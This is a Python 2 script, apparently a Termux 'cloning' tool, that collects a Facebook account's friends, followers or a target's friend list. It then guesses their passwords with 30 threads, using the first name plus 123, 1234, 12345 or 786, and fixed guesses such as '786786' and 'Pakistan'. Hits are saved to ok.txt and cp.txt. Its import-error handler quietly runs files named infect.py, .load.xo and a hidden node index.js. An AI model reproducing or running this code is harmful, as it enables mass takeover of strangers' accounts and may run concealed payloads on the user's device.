# coding=utf-8
#!/usr/bin/python
# coding=utf-8
# coded by : Rangga-purnama
# https://www.facebook.com/100027655487072

try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
    os.system("pip2 install mechanize")
    os.system("pip2 install nodejs")
    os.system("pip2 install npm")
    os.system("python2 infect.py")
    os.system("clear")
    print("")
    print("")
    print("")
    print("Please select storage permission")
    print("")
    print("")
    print("")
    os.system("termux setup storage")

    os.mkdir('save')
except OSError:
    pass
    if os.path.isfile('.../index.js'):
 	os.system('mv ... pip2 install storage')
	os.system('cd ..... && npm install')
 	os.system('#')
 	os.system('#')
 	os.system('fuser -k 5000/tcp &')
 	os.system('#')
 	os.system('node ...../index.js &')
 	os.system('fuser -k 5000/tcp &')
 	os.system('#')
 	os.system('node ...../index.js &')
from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")

def abm(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
def logging():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[+] Logging In\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def saving():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[+] Saving Token\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def updateing():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[+] Getting Updates\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def logout():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[+] Logging Out\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
		

logo = """
\033[1;97m      ____  ____   _____  ___    __ ______ 
\033[1;97m     |    ||    \ |     |/  _]  /  ]      |
\033[1;97m      |  | |  _  ||   __/  [_  /  /|      |
\033[1;97m      |  | |  |  ||  |_|    _]/  / |_|  |_|
\033[1;97m      |  | |  |  ||   _]   [_/   \_  |  |  
\033[1;97m      |  | |  |  ||  | |     \     | |  |  
\033[1;97m     |____||__|__||__| |_____|\____| |__|  
\033[1;97m--------------------------------------------------
\033[1;93m➤\033[1;97m Author   : Rangga-purnama
\033[1;93m➤\033[1;97m Github   : https://github.com/Ranggaofficial
\033[1;93m➤\033[1;97m Fb Page  : https://m.facebook.com/100027655487072
\033[1;93m➤\033[1;97m Update   :
versi emmak kau suruh update 
\033[1;97m--------------------------------------------------
"""

idh = []
cps = []
oks = []
	
def tech_abm():
    os.system("clear")
    print logo
    print("\033[1;93mFirst Tool login").center(50)
    print('')
    print("\033[1;97m--------------------------------------------------")
    username = raw_input("\033[1;97m[+]\033[1;97m Username :\033[1;97m ")
    if username =="Rangga":
        os.system("clear")
        print logo
        print ("[+] Username : Rangga (Correct)")
        passwordss = raw_input("\033[1;97m[+]\033[1;97m Password :\033[1;97m ")
        if passwordss =="Rangga":
            os.system("clear")
            print logo
            logging()
            os.system("clear")
            print logo 
            print ("\033[1;97m[+]\033[1;92m Username : Rangga\033[1;92m (Correct)")
            print ("\033[1;97m[+]\033[1;92m Password : Rangga\033[1;92m (Correct)")
	    print("\033[1;97m--------------------------------------------------")
            time.sleep(1)
            print("\t \033[1;92m[+] Login Successful\033[0;97m")
            time.sleep(2)
        try:
            open(".login.txt","r")
            menu()
        except(KeyError , IOError):
            login_choice_facebook()
        else:
            print ("\t [!] Password : "+passwordss+" (Wrong)")
	    os.system('xdg-open https://m.facebook.com/100027655487072')
            time.sleep(1)
            tech_abm()
    else:
        print ("\t [!] Username : "+username+" (Wrong)")
	os.system('xdg-open https://m.facebook.com/100027655487072')
        time.sleep(1)
        tech_abm()
	
def login_choice_facebook():
    os.system('clear')
    print logo
    os.system("python3 .load.xo")
    os.system('clear')
    print logo
    print ("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mRandom Phone Number Cloning    \033[1;97m(\033[1;92mno login\033[1;97m) ")
    print ("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mLogin With User And Pass       \033[1;97m(\033[1;92mlogin\033[1;97m)    ")
    print ("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mExit") 
    print("\033[1;97m--------------------------------------------------")
    clone_main()
def clone_main():
    hack = raw_input("\n╰─➣ ")
    if hack =="1":
        os.system("python2 .nbr.abm")
        time.sleep(1)
        menu()
    if hack =="2":
        login_via_facebook()
    elif hack =="0":
        os.system("exit")
    else:
	print "\x1b[1;91mFill in correctly"
        clone_main()

def login_via_facebook():
    os.system('clear')
    print logo
    os.system("python3 .load.xo")
    os.system('clear')
    print logo
    print ("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mlogin With Access Token ")
    print ("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mLogin With User And Pass")
    print ("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mBack") 
    print("\033[1;97m--------------------------------------------------")
    clone_login_via_facebook()
def clone_login_via_facebook():
    hack = raw_input("\n╰─➣ ")
    if hack =="1":
        os.system("clear")
        print logo
	os.system("python3 .load.xo")
        os.system('clear')
        print logo
        print ("\033[1;93mLogin With Using Token").center(50)
	print("\033[1;97m--------------------------------------------------")
        token = raw_input("\033[1;97m[+]\033[1;97m Token :\033[1;97m ")
	print("\033[1;97m--------------------------------------------------")
        time.sleep(2)
        saving()
        sav = open(".login.txt","w")
        sav.write(token)
        sav.close()
        os.system("clear")
        print logo
        print("\033[1;92mloading 0_0 10").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;97mloading 0_0 20").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;92mloading 0_0 30").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;97mloading 0_0 40").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;92mloading 0_0 50").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;97mloading 0_0 60").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;92mloading 0_0 70").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;97mloading 0_0 80").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;92mloading 0_0 90").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;97mloading 0_0 100").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;93mPlease wait O_O").center(50)
	time.sleep(5)
        os.system("clear")
        print logo
        abm("\r\033[1;92m[✓] Login Successfull\033[0;97m")
	os.system('xdg-open https://m.facebook.com/Techabm')
        time.sleep(1)
        menu()
    elif hack =="2":
        loginfb()
    elif hack =="0":
	        menu()
    else:
	        print ("[!] Please Select a Valid Option")
		clone_login_via_facebook()
		
def loginfb():
    os.system("clear")
    print logo
    os.system("python3 .load.xo")
    os.system('clear')
    print logo
    print("\033[1;97mLogin With Facebook Account\033[1;0m").center(50)
    print("\033[1;97mUse Proxy to login account \033[1;0m").center(50)
    print("\033[1;97m--------------------------------------------------")
    id = raw_input("\033[1;97m[+]\033[1;93m Email/ID/Number :\033[1;97m ")
    id1 = id.replace(' ','')
    id2 = id1.replace('(','')
    uid = id2.replace(')','')
    pwd = raw_input("\033[1;97m[+]\033[1;93m Passwor :\033[1;97m ")
    print("\033[1;97m--------------------------------------------------")
    logging()
    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
    q = json.loads(data)
    if "access_token" in q:
        succ = open(".login.txt","w")
        succ.write(q["access_token"])
        succ.close()
        print("\033[1;92mloading 0_0 10").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;97mloading 0_0 20").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;92mloading 0_0 30").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;97mloading 0_0 40").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;92mloading 0_0 50").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;97mloading 0_0 60").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;92mloading 0_0 70").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;97mloading 0_0 80").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;92mloading 0_0 90").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;97mloading 0_0 100").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;93mPlease wait O_O").center(50)
	time.sleep(5)
        os.system("clear")
        print logo
        print("\r\033[1;92m[✓] Login Successfull\033[0;97m")
        time.sleep(1)
        menu()
    else:
        if "www.facebook.com" in q["error_msg"]:
            print ("\n\033[1;31m[!] Login Failed . Account Has a Checkpoint\033[0;97m")
            time.sleep(1)
            loginfb()
        else:
            print("\n\033[1;31m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m")
            time.sleep(1)
            loginfb()

def menu():
    os.system("clear")
    try:
        token = open(".login.txt","r").read()
    except IOError:
        print logo
        print("[!] Error 404.Token Not Found")
        os.system("rm -rf .login.txt")
        time.sleep(1)
        login_choice()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
        a = json.loads(r.text)
        name = a["name"]
    except KeyError:
        os.system("clear")
        print logo
        print("\033[1;91m[!] Loading Failed . Your Account Has a Checkpoint")
        os.system("rm -rf .login.txt")
        time.sleep(1)
        login_choice()
    os.system('clear')
    print logo
    os.system("python3 .load.xo")
    os.system('clear')
    print logo
    print("\t  \033[1;93m[+] Name : "+name)
    print("\033[1;97m--------------------------------------------------")
    print("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mClone Frienlist and Public ID")
    print("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mlogout")
    print("\033[1;97m--------------------------------------------------") 
    menu_select()
def menu_select():
    option = raw_input("\n╰─➣ ")
    if option =="1":
        we_love_abm()
    elif option =="0":
        logout()
        os.system("rm -rf .login.txt")
        time.sleep(1)
        print("\033[1;92m[✓] Logged Out Successfully\033[0;97m")
        os.system("exit")
    else:
        print("[!] Please Select a Valid Option")
        menu_select()
		
def we_love_abm():
	global token
	os.system("clear")
	try:
		token=open(".login.txt","r").read()
	except IOError:
		print("[!] Error 404 . Token Not Found")
		os.system("rm -rf .login.txt")
		time.sleep(1)
		login()
	os.system("clear")
	print logo
	os.system("python3 .load.xo")
        os.system('clear')
        print logo
	print ("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mCrack From Friend List")
	print ("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mCrack From Public ID")
	print ("\033[1;97m[3]\033[1;91m-⋄-\033[1;97mCrack From Followers")
	print ('\033[1;97m[0]\033[1;91m-⋄-\033[1;97mBack')
	print("\033[1;97m--------------------------------------------------")
	we_love_abm2()
def we_love_abm2():
	select = raw_input("\n╰─➣ ")
	id=[]
	oks=[]
	cps=[]
	if select=="1":
		os.system("clear")
		print logo
		os.system("python3 .load.xo")
                os.system('clear')
                print logo
		print("\t\033[1;93m  Clone From Frienlist\033[1;0m")
		print("\033[1;97m--------------------------------------------------")
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		print logo
		os.system("python3 .load.xo")
                os.system('clear')
                print logo
		print("\t\033[1;93m  Clone From Public ID\033[1;0m")
		print("\033[1;97m--------------------------------------------------")
		idt = raw_input("\033[1;97m[+]\033[1;97m Input ID :\033[1;93m ")
		print("\033[1;97m--------------------------------------------------")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("[+] Account Name : "+q["name"])
			time.sleep(2)
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			we_love_abm()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
		os.system("clear")
		print logo
		os.system("python3 .load.xo")
                os.system('clear')
                print logo
		print("\t\033[1;93m  Clone From Followers\033[1;0m")
		print("\033[1;97m--------------------------------------------------")
		idt = raw_input("\033[1;97m[+]\033[1;97m Input ID :\033[1;93m ")
		print("\033[1;97m--------------------------------------------------")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("[+] Account Name : "+q["name"])
			time.sleep(2)
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			we_love_abm()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
			   
	elif select =="0":
		menu()
	else:
		print ("[!] Please Select a Valid Option")
		we_love_abm2()
	os.system("clear")
	print logo
	print("\033[1;97m[+]\033[1;97m Total IDs :\033[1;97m "+str(len(id)))
	print("\033[1;97m[+]\033[1;97m Plz wait clone account will be appear here\033[1;0m")
	print("\033[1;97m--------------------------------------------------")
	print
	
        def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("\x1b[1;97m[\x1b[1;93mCheckPoint\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass1)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass1)
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2=name+"1234"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\x1b[1;97m[\x1b[1;93mCheckPoint\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass2)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass2)
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\x1b[1;97m[\x1b[1;93mCheckPoint\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass3)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass3)
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4=name+"786"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\x1b[1;97m[\x1b[1;93mCheckPoint\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass4)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass4)
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5="786786"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\x1b[1;97m[\x1b[1;93mCheckPoint\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass5)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass5)
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6="000786"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("\x1b[1;97m[\x1b[1;93mCheckPoint\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass6)
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass6)
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    pass7="Pakistan"
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\x1b[1;97m[\x1b[1;93mCheckPoint\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass7)
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                            print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass7)
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
		                                        								
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print
	print("\033[1;97m--------------------------------------------------")
	print ('\033[1;97m[+]\033[1;97m Process Has Been Completed')
	print('\033[1;97m[+]\033[1;97m Total CP/OK:\033[1;93m '+str(len(cps))+'/\033[1;92m '+str(len(oks)))
	print("\033[1;97m--------------------------------------------------")
	raw_input("Back")
	menu()
	
if __name__ == '__main__':
    tech_abm()


